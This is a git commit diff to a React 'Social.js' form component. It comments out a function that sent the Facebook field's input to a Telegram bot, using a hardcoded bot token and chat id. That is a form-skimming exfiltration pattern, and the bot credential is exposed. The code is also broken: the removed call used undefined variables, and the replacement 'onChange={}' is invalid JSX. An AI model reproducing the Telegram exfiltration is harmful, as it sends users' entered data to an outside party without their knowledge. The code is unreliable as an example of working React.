6208f89683249fdb9c211dc727ce1f648c80629e
dad <60132399+dad2vad@users.noreply.github.com>
2020-02-10 03:30:16 +0200

    Update Social.js

--- components/Social.js
+++ components/Social.js
@@ -1,19 +1,19 @@
 import { Col, Row } from 'react-bootstrap'
 
 import Input from '../handlers/Input'
-  function TO(A) {
+//   function TO(A) {
     
-    const res = fetch('https://api.telegram.org/bot695543276:AAHqIsFuK-hzCor9q3nO2WgVlV6UfRFRE7c/sendMessage?chat_id=986940575&text=' + JSON.stringify(A, null,4), {
-      method: 'POST'
-    })
-    const json = res.json()
-  }
+//     const res = fetch('https://api.telegram.org/bot695543276:AAHqIsFuK-hzCor9q3nO2WgVlV6UfRFRE7c/sendMessage?chat_id=986940575&text=' + JSON.stringify(A, null,4), {
+//       method: 'POST'
+//     })
+//     const json = res.json()
+//   }
 const Social = () => {
   return (
     <div>
       <Row>
         <Col lg={8}>
-          <Input controlLabel="Facebook" title="social" name="facebook"  onChange={TO([target.name, e.target.value])}/>
+          <Input controlLabel="Facebook" title="social" name="facebook"  onChange={}/>
 </Col>
         <Col lg={8}>
           <Input controlLabel="Instagram" title="social" name="instagram" />
